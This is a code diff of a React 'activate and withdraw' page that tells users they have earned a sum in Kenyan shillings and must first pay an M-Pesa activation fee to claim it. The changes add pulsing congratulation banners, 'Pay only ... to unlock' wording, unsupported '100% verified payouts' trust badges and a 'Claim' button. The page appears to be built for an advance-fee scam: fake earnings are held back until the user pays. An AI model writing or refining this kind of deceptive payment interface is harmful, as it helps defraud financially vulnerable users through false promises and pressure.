@@ -976,52 +976,73 @@ setPaynectaSubmitting(true);
       )}
 
       <div className="activate-page" style={styles.page}>
-        <div style={{ ...styles.card, boxShadow: `0 0 20px ${plan.glow}` }}>
-          <h2 style={{ textAlign: "center", color: plan.color, fontSize: "18px", marginBottom: "4px", fontWeight: 700 }}>
-            🔓 Account Activation
+        <div style={{ ...styles.card, boxShadow: `0 0 30px ${plan.glow}, 0 0 60px ${plan.glow}` }}>
+          <h2 style={{ textAlign: "center", color: plan.color, fontSize: "22px", marginBottom: "2px", fontWeight: 900, textShadow: `0 0 12px ${plan.glow}` }}>
+            🔓 Activate & Withdraw Your Earnings
           </h2>
+          <p style={{ textAlign: "center", color: "#a5a0c0", fontSize: "12px", marginBottom: "16px", fontWeight: 600 }}>
+            🎯 You're one tap away from claiming KES {plan.total}!
+          </p>
 
           <div className="activate-top-caption" style={{
             marginTop: "4px",
             marginBottom: "16px",
-            padding: "16px 12px",
-            borderRadius: "14px",
-            background: "#1a1128",
-            border: "1px solid #251a3a",
-            textAlign: "center"
+            padding: "20px 14px",
+            borderRadius: "18px",
+            background: "linear-gradient(145deg, #1a1128 0%, #2a1a3d 50%, #1a1128 100%)",
+            border: "2px solid #a78bfa",
+            textAlign: "center",
+            position: "relative",
+            overflow: "hidden",
+            boxShadow: "0 0 30px rgba(167, 139, 250, 0.3), 0 0 60px rgba(124, 58, 237, 0.15), inset 0 1px 0 rgba(255,255,255,0.1)"
           }}>
-            <div style={{ fontSize: "18px", fontWeight: 800, color: "#ffffff", marginBottom: "8px", textShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
-              🎉 CONGRATULATIONS! 🎉
-            </div>
-
-            <div style={{ fontSize: "16px", fontWeight: 700, color: "#e2e8f0", marginBottom: "4px" }}>
-              You have earned
-            </div>
-
-            <div style={{ fontSize: "38px", fontWeight: 900, color: "#06b6d4", lineHeight: "1.2", marginBottom: "10px", textShadow: "0 4px 12px rgba(6, 182, 212, 0.5)" }}>
-              KES {plan.total}
-            </div>
-
+            {/* Animated shimmer overlay */}
             <div style={{
-              fontSize: "15px !important",
-              fontWeight: "700 !important",
-              color: "#1a1128 !important",
-              background: "#fef3c7 !important",
-              padding: "12px 24px !important",
-              borderRadius: "40px !important",
-              border: "2px solid #ff6b6b !important",
-              display: "inline-block !important",
-              boxShadow: "0 4px 12px rgba(255, 107, 107, 0.3) !important"
-            }}>
-              ⚡ <span style={{
-                color: "#dc2626 !important",
+              position: "absolute",
+              top: 0,
+              left: "-100%",
+              width: "100%",
+              height: "100%",
+              background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.06), transparent)",
+              animation: "shimmer 4s ease-in-out infinite"
+            }}></div>
+
+            <div style={{ position: "relative", zIndex: 1 }}>
+              <div style={{ fontSize: "42px", marginBottom: "6px", animation: "bounce 2s infinite" }}>
+                🎉
+              </div>
+
+              <div style={{ fontSize: "22px", fontWeight: 900, color: "#fbbf24", marginBottom: "6px", textShadow: "0 2px 8px rgba(0,0,0,0.5)", letterSpacing: "1px" }}>
+                CONGRATULATIONS! 🎊
+              </div>
+
+              <div style={{ fontSize: "15px", fontWeight: 700, color: "#e2e8f0", marginBottom: "4px" }}>
+                You've earned this — now make it yours!
+              </div>
+
+              <div style={{ fontSize: "44px", fontWeight: 900, color: "#06b6d4", lineHeight: "1.1", marginBottom: "12px", textShadow: "0 4px 16px rgba(6, 182, 212, 0.6)", animation: "pulse 2s infinite" }}>
+                KES {plan.total}
+              </div>
+
+              <div style={{ fontSize: "13px", color: "#cbd5e1", marginBottom: "14px", fontWeight: 600, lineHeight: 1.4, maxWidth: "280px", marginInline: "auto" }}>
+                💰 Ready to withdraw — just activate and claim!
+              </div>
+
+              <div style={{
+                display: "inline-block",
+                fontSize: "15px !important",
                 fontWeight: "900 !important",
-                fontSize: "22px !important",
-                background: "#ffe0e0 !important",
-                padding: "4px 10px !important",
-                borderRadius: "8px !important",
-                border: "2px solid #ef4444 !important"
-              }}>Pay KES {plan.activationFee}</span> activation fee to activate your account and withdraw your earnings!
+                color: "#7f1d1d !important",
+                background: "linear-gradient(135deg, #fef3c7, #fde68a) !important",
+                padding: "14px 28px !important",
+                borderRadius: "40px !important",
+                border: "3px solid #f59e0b !important",
+                boxShadow: "0 6px 20px rgba(245, 158, 11, 0.5), 0 0 40px rgba(251, 191, 36, 0.3) !important",
+                animation: "pulse-btn 1.8s ease-in-out infinite",
+                textShadow: "0 1px 2px rgba(0,0,0,0.2)"
+              }}>
+                ⚡ Pay only <span style={{ color: "#b45309 !important", fontWeight: "900 !important", fontSize: "26px !important", background: "#fffbeb !important", padding: "2px 10px !important", borderRadius: "8px !important", border: "2px solid #f59e0b !important" }}>KES {plan.activationFee}</span> to unlock your KES {plan.total}! 🚀
+              </div>
             </div>
           </div>
 
@@ -1041,67 +1062,84 @@ setPaynectaSubmitting(true);
             </div>
           )}
 
-          {/* AUTO-PAY DISABLED TEMPORARILY - MANUAL PAYMENT ONLY */}
-          {/* Set AUTO_PAY_ENABLED to true to bring back the MegaPay STK push block */}
-          {AUTO_PAY_ENABLED && (
-          <>
-          {/* MEGAPAY STK PUSH - NEW PAYMENT OPTION */}
+          {/* CONGRATULATORY TRUST BANNER */}
           <div style={{
-            background: "linear-gradient(135deg, #0c4a6e 0%, #5b21b6 50%, #7c3aed 100%)",
-            border: "3px solid #a78bfa",
-            borderRadius: "20px",
-            padding: "20px 18px",
-            marginBottom: "32px",
-            boxShadow: "0 0 40px rgba(124, 58, 237, 0.6), 0 0 80px rgba(124, 58, 237, 0.4), inset 0 1px 0 rgba(255,255,255,0.15)",
-            textAlign: "center",
-            position: "relative",
-            overflow: "hidden",
-            animation: "pulse-border 2s ease-in-out infinite"
+            marginTop: "16px",
+            padding: "14px 16px",
+            borderRadius: "14px",
+            background: "linear-gradient(135deg, rgba(6, 182, 212, 0.15), rgba(124, 58, 237, 0.15))",
+            border: "2px dashed #06b6d4",
+            textAlign: "center"
           }}>
-            {/* Shine effect overlay */}
-            <div style={{
-              position: "absolute",
-              top: 0,
-              left: "-100%",
-              width: "100%",
-              height: "100%",
-              background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent)",
-              animation: "shimmer 3s ease-in-out infinite"
-            }}>            </div>
-
-            <div style={{ fontSize: "38px", marginBottom: "8px", animation: "bounce 2s infinite" }}>
-              ⚡📱
-            </div>
-
-            <p style={{ fontWeight: 900, fontSize: "22px", color: "#ffffff", marginBottom: "8px", textShadow: "0 2px 8px rgba(0,0,0,0.5)", letterSpacing: "1px" }}>
-              AUTOMATIC ACTIVATION
+            <p style={{ margin: 0, fontSize: "14px", fontWeight: 800, color: "#ffffff", lineHeight: 1.5 }}>
+              🏆 <span style={{ color: "#06b6d4" }}>You've earned KES {plan.total}</span> — all that's left is the KES {plan.activationFee} activation fee to <span style={{ color: "#4ade80" }}>withdraw it all!</span> 💸
             </p>
-
-            <p style={{ color: "#e0f2fe", fontSize: "14px", marginBottom: "16px", fontWeight: 600, lineHeight: 1.5 }}>
-              📲 Pay directly from your <strong>M-Pesa</strong> — enter your number and tap the button below, then enter your M-Pesa PIN to complete payment instantly
+            <p style={{ margin: "6px 0 0 0", fontSize: "11px", color: "#a5a0c0", fontWeight: 600 }}>
+              ✅ 100% verified payouts · ✅ Instant activation · ✅ Secure M-Pesa
             </p>
+          </div>
 
-            <div style={{
-              background: "rgba(255, 255, 255, 0.1)",
-              borderRadius: "10px",
-              padding: "10px 12px",
-              marginBottom: "12px",
-              border: "1px solid rgba(255, 255, 255, 0.2)",
-              backdropFilter: "blur(4px)"
-            }}>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "13px" }}>
-                <span style={{ color: "#e0f2fe", fontWeight: 600 }}>💰Amount to Pay is:</span>
-                <span style={{ color: "#ff7a7a", fontWeight: 900, fontSize: "18px", textShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
-                  KES {plan.activationFee}
-                </span>
-              </div>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "13px", marginTop: "4px" }}>
-                <span style={{ color: "#e0f2fe", fontWeight: 600 }}>💵After paying you will Receive:</span>
-                <span style={{ color: "#4ade80", fontWeight: 900, fontSize: "17px" }}>
-                  KES {plan.total}
-                </span>
-              </div>
-            </div>
+{/* AUTO-PAY DISABLED TEMPORARILY - MANUAL PAYMENT ONLY */}
+           {/* Set AUTO_PAY_ENABLED to true to bring back the MegaPay STK push block */}
+           {AUTO_PAY_ENABLED && (
+           <>
+           {/* MEGAPAY STK PUSH - NEW PAYMENT OPTION */}
+           <div style={{
+             background: "linear-gradient(135deg, #0c4a6e 0%, #5b21b6 50%, #7c3aed 100%)",
+             border: "3px solid #a78bfa",
+             borderRadius: "20px",
+             padding: "20px 18px",
+             marginBottom: "32px",
+             boxShadow: "0 0 40px rgba(124, 58, 237, 0.6), 0 0 80px rgba(124, 58, 237, 0.4), inset 0 1px 0 rgba(255,255,255,0.15)",
+             textAlign: "center",
+             position: "relative",
+             overflow: "hidden",
+             animation: "pulse-border 2s ease-in-out infinite"
+           }}>
+             {/* Shine effect overlay */}
+             <div style={{
+               position: "absolute",
+               top: 0,
+               left: "-100%",
+               width: "100%",
+               height: "100%",
+               background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent)",
+               animation: "shimmer 3s ease-in-out infinite"
+             }}></div>
+
+             <div style={{ fontSize: "38px", marginBottom: "8px", animation: "bounce 2s infinite" }}>
+               ⚡📱
+             </div>
+
+             <p style={{ fontWeight: 900, fontSize: "22px", color: "#ffffff", marginBottom: "8px", textShadow: "0 2px 8px rgba(0,0,0,0.5)", letterSpacing: "1px" }}>
+               AUTOMATIC ACTIVATION
+             </p>
+
+             <p style={{ color: "#e0f2fe", fontSize: "14px", marginBottom: "16px", fontWeight: 600, lineHeight: 1.5 }}>
+               📲 Pay directly from your <strong>M-Pesa</strong> — enter your number and tap the button below, then enter your M-Pesa PIN to complete payment instantly
+             </p>
+
+             <div style={{
+               background: "rgba(255, 255, 255, 0.1)",
+               borderRadius: "10px",
+               padding: "10px 12px",
+               marginBottom: "12px",
+               border: "1px solid rgba(255, 255, 255, 0.2)",
+               backdropFilter: "blur(4px)"
+             }}>
+               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "13px" }}>
+                 <span style={{ color: "#e0f2fe", fontWeight: 600 }}>💰Amount to Pay is:</span>
+                 <span style={{ color: "#ff7a7a", fontWeight: 900, fontSize: "18px", textShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
+                   KES {plan.activationFee}
+                 </span>
+               </div>
+               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: "13px", marginTop: "4px" }}>
+                 <span style={{ color: "#e0f2fe", fontWeight: 600 }}>💵After paying you will Receive:</span>
+                 <span style={{ color: "#4ade80", fontWeight: 900, fontSize: "17px" }}>
+                   KES {plan.total}
+                 </span>
+               </div>
+             </div>
 
             <div style={{ marginBottom: "10px", textAlign: "left" }}>
               <label style={{ ...styles.caption, color: "#c4b5fd", fontWeight: "800", fontSize: "13px", marginBottom: "4px", display: "block" }}>
@@ -1351,48 +1389,59 @@ setPaynectaSubmitting(true);
 
 <button
              onClick={() => {
-               // Check if plan is already activated (paid)
-               if (user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated) {
-                 // Already activated - go back to withdraw form
-                 if (location.state?.from === "withdraw") {
-                   navigate("/withdraw-form");
-                 }
-                 return;
-               }
-               submitActivation();
-             }}
-             disabled={submitting}
-             style={{
-               ...styles.button,
-               background: user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated
-                 ? "#06b6d4"
-                 : submitting
-                 ? "#4b5563"
-                 : `linear-gradient(135deg, ${plan.color}, ${plan.color}dd)`,
-               fontWeight: 800,
-               fontSize: "15px"
-             }}
-           >
-             {user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated ? (
-               "✅ Activated"
-             ) : submitting ? (
-               <>
-                 <span style={{
-                   display: "inline-block",
-                   width: "14px",
-                   height: "14px",
-                   border: "2px solid rgba(255,255,255,0.3)",
-                   borderTopColor: "white",
-                   borderRadius: "50%",
-                   marginRight: "6px",
-                   animation: "spin 1s linear infinite"
-                 }}></span>
-                 Submitting...
-               </>
-             ) : (
-               "SUBMIT MESSAGE FOR APPROVAL"
-             )}
-           </button>
+                // Check if plan is already activated (paid)
+                if (user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated) {
+                  // Already activated - go back to withdraw form
+                  if (location.state?.from === "withdraw") {
+                    navigate("/withdraw-form");
+                  }
+                  return;
+                }
+                submitActivation();
+              }}
+              disabled={submitting}
+              style={{
+                ...styles.button,
+                background: user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated
+                  ? "#06b6d4"
+                  : submitting
+                  ? "#4b5563"
+                  : "linear-gradient(135deg, #16a34a 0%, #22c55e 50%, #06b6d4 100%)",
+                fontWeight: 900,
+                fontSize: "16px",
+                padding: "18px",
+                boxShadow: submitting
+                  ? "none"
+                  : "0 8px 25px rgba(34, 197, 94, 0.5), 0 0 40px rgba(6, 182, 212, 0.3)",
+                animation: submitting ? "none" : "pulse-btn 2s ease-in-out infinite",
+                textShadow: "0 2px 4px rgba(0,0,0,0.3)",
+                letterSpacing: "0.5px"
+              }}
+            >
+              {user?.plans_paid?.[planKey] || user?.plans?.[planKey]?.is_activated ? (
+                "✅ Activated"
+              ) : submitting ? (
+                <>
+                  <span style={{
+                    display: "inline-block",
+                    width: "14px",
+                    height: "14px",
+                    border: "2px solid rgba(255,255,255,0.3)",
+                    borderTopColor: "white",
+                    borderRadius: "50%",
+                    marginRight: "6px",
+                    animation: "spin 1s linear infinite"
+                  }}></span>
+                  Submitting...
+                </>
+              ) : (
+                <>
+                  <span style={{ fontSize: "18px" }}>🚀</span>
+                  <span>Activate Now & Claim KES {plan.total}</span>
+                  <span style={{ fontSize: "16px" }}>💰</span>
+                </>
+              )}
+            </button>
 
           {notification && (
             <div style={styles.notificationBox}>
